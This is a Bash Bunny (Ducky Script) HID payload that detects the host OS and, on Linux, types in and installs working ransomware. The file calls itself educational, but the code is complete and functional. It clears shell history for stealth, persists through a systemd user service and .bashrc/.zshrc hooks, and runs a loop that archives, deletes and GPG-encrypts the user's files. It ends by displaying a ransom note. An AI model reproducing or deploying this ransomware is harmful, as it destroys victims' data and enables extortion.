####### Description: OS Scanner 
####### AUTHOR: Josip Huzovic
####### Version: 1.0            
####### Category: OS Scanner       
####### Target: Windows, Linux  
####### Attackmode: HID STORAGE 

# Note: The file previously named `payload.txt` has been renamed to `educational_payload.txt` to clarify that this is a simulation intended only for safe, educational testing in isolated environments.

# This project uses a Bash Bunny Mark II (Hak5) HID attack platform to deliver the simulated payload. 
# For this reason the code within is written in Ducky Script and can be destructive, intended only for behavioral and demonstrative simulation in isolated lab environments.


# This mode allows the Bash Bunny to act as an external drive while having keyboard access
ATTACKMODE HID STORAGE

# Checks to see which OS the system is depending on if this command goes through
Q CTRL-ALT t
RUN WIN powershell
Q STRING "'Windows' | Out-File -FilePath E:\loot\OS.txt -Encoding utf8 -NoNewline"
Q ENTER
Q STRING exit
Q ENTER

OS="/root/udisk/loot/OS.txt"

Q DELAY 500

if [ -f "$OS" ]; then
    # Checks if the OS file exists, implying the target machine was successfully probed.
    CONTENT=$(cat "$OS" | sed '1s/^\xEF\xBB\xBF//')
    # Reads the content of the OS file, removing any Byte Order Mark (BOM) so it is readable to the BB

    # Check the content
    if [[ "$CONTENT" == "Windows" ]]; then
        # If the target OS is Windows, turn the LED red and prepare for the Windows attack
        LED R 
        RUN WIN powershell
	Q STRING "'Empty' | Out-File -FilePath E:\loot\OS.txt -Encoding utf8 -NoNewline"
	Q ENTER
        Q STRING 'WINDOWS RANSOMWARE MISSING'
    else
        LED B
        # If the target OS is not Windows, switch to Linux mode.
        Q CTRL-ALT t
        Q DELAY 100
        Q STRING 'vi'
	Q ENTER
	Q ENTER
	Q STRING ' RRANSOMWARE INCOMING'
	Q ENTER
	LED R
	Q STRING 3
	Q DELAY 500
	Q ENTER
	LED Y
	Q STRING 2
	Q DELAY 500
	Q ENTER
	LED G
	Q STRING 1
	Q DELAY 500
	Q ENTER
	Q STRING START
	Q ENTER
	Q ESC
	Q STRING ':q!'
	Q ENTER
	Q STRING exit
	Q ENTER

####### Linux Ransomware Starts Here 
	
####### Description: Ransomware which encrypts users data without root privileges on Linux OS
####### AUTHOR: Josip Huzovic
####### Version: 1.0 
####### Category: Ransomware
####### Target: Linux
####### Attackmodes: HID

	LED M 100
	# Sets the LED to magenta, indicating the start of malicious activity

############## [Importing GPG Public Key] ##############

	Q DELAY 500
	Q CTRL-ALT t
	Q DELAY 1000
	Q STRING unset HISTFILE && HISTSIZE=0 && rm -f $HISTFILE && unset HISTFILE
	# Hides shell history for stealth.
	Q ENTER
	Q DELAY 300
	Q STRING touch public.pub
	Q ENTER
	Q DELAY 200
	Q STRING vi public.pub
	Q ENTER
	Q DELAY 50
	Q STRING i
	Q DELAY 200
	Q STRING -----BEGIN PGP PUBLIC KEY BLOCK-----
	# Begins importing a PGP public key, which is used for the encryption
	Q ENTER
	Q ENTER
	Q STRING mQENBGc2I+kBCAC5zktgZCz1mH9iZlfPGMxr0SoloH+1cIj3fi/Yb8odQbCZTFf
	Q STRING s/xONCNyxZc5vRp6mmYbvxTnXbbU88G2ZfbTvJCEwNKN0ppDIGEFF00zeCUMkTv
	Q STRING +7oB2KjRmLPnLdY3ckzMKhXQViGfdU2BDZyU4ePRCTLvUSXEurKEHsDchztAh6T
	Q STRING gAbmWOA5H7FWwuyx1CWjNM9rGXh1XgkCAKyI58TxJ0X6SQaK94n1QyinEeFa1Q6
	Q STRING poj/QTah/PgAJAZpDkbFgKQmHvoA2w56wR+W7VfmrI9kr3Ux/UtkL/DnJX7YTK4
	Q STRING 5LEYY/GYm1LQsCuoTo2oHukNA8VshG1cjyZeJlinPABEBAAG0ImNyb2NzdGVyID
	Q STRING xjcm9jc3RlckBwcm90b25tYWlsLmNvbT6JAU4EEwEKADgWIQRhjtxWk+m38qWkl
	Q STRING 4fJwX6CHMcPVwUCZzYj6QIbAwULCQgHAgYVCgkICwIEFgIDAQIeAQIXgAAKCRDJ
	Q STRING wX6CHMcPV1wcB/wL294eyKmbYW/+HgzWPD7k2PstAEJYluJWfRgdNf+LJOT2d4C
	Q STRING Hjvq6SHhT+T1ySU6uXK0HAreZ0XcuJ0FbtZIL+PMQY6dXE0hGLo76o5597xHp8b
	Q STRING dAVrOBpWFJZgpozGCVhHWsEiRxezNEKPEcCaWB+5T+kG2PLbivPA/Pqy48ebPMG
	Q STRING 8ZNm5ty8W6Yd3zH+92K3YeCZ2TLQXerdEcx1XUSYHCHBTPrWm0OcnD2IDRntCVl
	Q STRING jkTMgQYjBEgA3MtSXaUEQBq0QJPV+lr3aLsR1z4aQgwdjHvKkl8EweTgLfIj8k2
	Q STRING tPZBm3Ei/yvRcS6YaKzkABfj8BRe7y0KJOJPIq6FOuQENBGc2I+kBCACzS8y1rb
	Q STRING rbKdjtx3A+gbFzWCzj6066oqLnK8pgOT2oR0pMgQv19tu5EDaFbS9dETykMLlz5
	Q STRING 9SS4dZMFdAbQecWcXhZwDmjzRdgsb+yxTL/wANWLm6IoTjX9Q8EhYB5oFystm3f
	Q STRING 2bJ9q4/chFulMgGCqLR1whBimHxxIgEACjaXPgFoMvM/HdIIiJL0xeeewo7cH2M
	Q STRING OrU4s0E5DbF1PKBKRRjVwQUKdQLweHGdOku67/lJfhJLM8bLm+c4uaojX7y9T3O
	Q STRING LZCog804Asqh1HQ4v+Zx7A2q8vZrv4AaNoZiXFjQ4x5/WMnC9mxWvr/NhaT38se
	Q STRING yv6j2zyp+4iguDsSNh3ABEBAAGJATYEGAEKACAWIQRhjtxWk+m38qWkl4fJwX6C
	Q STRING HMcPVwUCZzYj6QIbDAAKCRDJwX6CHMcPV8sdCAC10uRwHMWoYVEPXwRrJkeMyRn
	Q STRING dM7mvZBAUd/WhvroGpbnGzJFnv0RF/4C9HDQEdliAkUrt1fRGTrmftxbOZWyL5f
	Q STRING dZI3yojrq31PBZzxisC13ju+ZCBSVS4WBF8On9FjbyeUSBIiHglE8Qt28lanqp2
	Q STRING r7cBOfJS4KH+UVE/UpDiv0fATuNYibedVGwjq+dpwF9KDgC9LjnYgsv0gmRVvgF
	Q STRING eMbGY8vKuTC/Ft+0+/RDW9T0WzAgGHd4djnzHaRjlDfJdOPSFtgFGZD6hXmThbx
	Q STRING upD4jGwEGVL07yntsDmN9eg93ftVppymMgBF6Y0YmE09zzirINCk3RlXp40AgRiuM
	Q ENTER
	Q STRING =49TS
	Q ENTER

	Q STRING -----END PGP PUBLIC KEY BLOCK-----
	Q ESC
	Q DELAY 300 
	Q STRING :wq
	Q ENTER
	Q DELAY 300
	Q STRING gpg --import public.pub && rm -rf public.pub
	Q ENTER


	# Persistent service to ensure ransomware runs continuously.
	Q DELAY 200
	Q STRING 'mkdir ~/.ransom'
	Q ENTER
	Q DELAY 100
	Q STRING 'mkdir -p ~/.config/systemd/user && touch ~/.config/systemd/user/ransomified.service' 
	Q ENTER
	Q DELAY 100
	Q STRING 'cat >> ~/.config/systemd/user/ransomified.service' 
	Q DELAY 200
	Q ENTER
	Q DELAY 50
	Q STRING [Unit]
	Q ENTER

	Q ENTER
	Q STRING [Service]
	Q ENTER
	Q CTRL d
	Q STRING 'echo ExecStart=/bin/bash /home/$(whoami)/.system/crocster -no-browser >> ~/.config/systemd/user/ransomified.service '
	Q ENTER
	Q STRING 'cat >> ~/.config/systemd/user/ransomified.service '
	Q ENTER
	Q STRING Restart=on-failure
	Q ENTER
	Q STRING SuccessExitStatus=3 4
	Q ENTER
	Q STRING RestartForceExitStatus=3 4
	Q ENTER
	Q ENTER
	Q STRING [Install]
	Q ENTER
	Q STRING WantedBy=default.target
	Q ENTER
	Q CTRL d

############## [Ransomware Script] ##############

	Q DELAY 500
	Q STRING 'mkdir ~/.system && touch ~/.system/crocster && vi ~/.system/crocster' 
	Q ENTER
	Q STRING i
	Q DELAY 300
	Q STRING '#!/bin/sh'
	Q ENTER
	Q STRING 'RANSOM_DIR="$HOME/.ransom"' 
	Q ENTER
	Q STRING 'encrypt() {'
	Q ENTER
	Q STRING '    dirFile=$(ls | head -n 1)'
	Q ENTER
	Q STRING '    if [ -z "$dirFile" ]; then'
	Q ENTER
	Q STRING '        return'
	Q ENTER
	Q STRING '    fi'
	Q ENTER
	Q STRING '    tar cf "${RANSOM_DIR}/${dirFile}.tar.gz" --exclude='.' --exclude='..' --exclude="${RANSOM_DIR}" --remove-files "${dirFile}"'
	Q ENTER
	Q STRING '    gpg -e -r crocster -o "${RANSOM_DIR}/${dirFile}.tar.gpg" "${RANSOM_DIR}/${dirFile}.tar.gz"'
	Q ENTER
	Q STRING '    rm -f "${RANSOM_DIR}/${dirFile}.tar.gz"'
	Q ENTER
	Q STRING '}'
	Q ENTER
	Q STRING 'while true; do'
	Q ENTER
	Q STRING '    encrypt'
	Q ENTER
	Q STRING done
	Q DELAY 100
	Q ESC
	Q STRING ':wq'
	Q ENTER
	Q DELAY 100
	Q STRING 'chmod +x ~/.system/crocster'
	Q ENTER
	Q DELAY 100
	Q STRING gpg --edit-key crocster
	Q ENTER
	Q DELAY 100
	Q STRING trust
	Q ENTER
	Q DELAY 100
	Q STRING 5
	Q ENTER 
	Q DELAY 50
	Q STRING y
	Q ENTER
	Q CTRL c
	Q DELAY 100
	Q STRING gpg --check-trustdb
	Q ENTER
	Q STRING gpg --update-trustdb
	Q ENTER
	Q DELAY 100
	Q STRING systemctl --user enable --now ransomified.service
	Q ENTER
	Q DELAY 100
	Q STRING systemctl --user start ransomified.service
	Q ENTER
	Q DELAY 150

############## [Autostart on Opening Terminal] ##############

	Q STRING 'echo systemctl --user enable --now ransomified.service >> ~/.zshrc '
	Q ENTER
	Q DELAY 50
	Q STRING 'echo systemctl --user enable --now ransomified.service >> ~/.bashrc' 
	Q ENTER

	# Modifying ~/.bashrc and ~/.zshrc ensures the ransomware starts every time the terminal is launched
	
	LED B
	# Light briefly turns blue to signify end of ransomware portion

############## [Ransom Note] ##############

	Q STRING vi 
	Q DELAY 100
	Q ENTER
	Q STRING 'Uh O'
	Q STRING '########################################'
	Q ENTER
	Q STRING '#          YOUR FILES ARE LOCKED       #'
	Q ENTER
	Q STRING '#    CONTACT hacker@gmail.com TO PAY   #'
	Q ENTER
	Q STRING '#         DO NOT SHUT DOWN             #'
	Q ENTER
	Q STRING '########################################'
	Q ENTER
	Q ENTER
	Q STRING 'EFFECTS CAN BE REVERSED WITH MY KEY'
	Q ENTER
	Q STRING 'you should really take better care of'
	Q ENTER
	Q STRING '            your stuff ;)'
	
	LED FINISH
	# Light turns green to signify end of payload

    fi
else
    # If for whatever reason, the OS folder doesn't exist, show an error (yellow)
        LED Y
fi
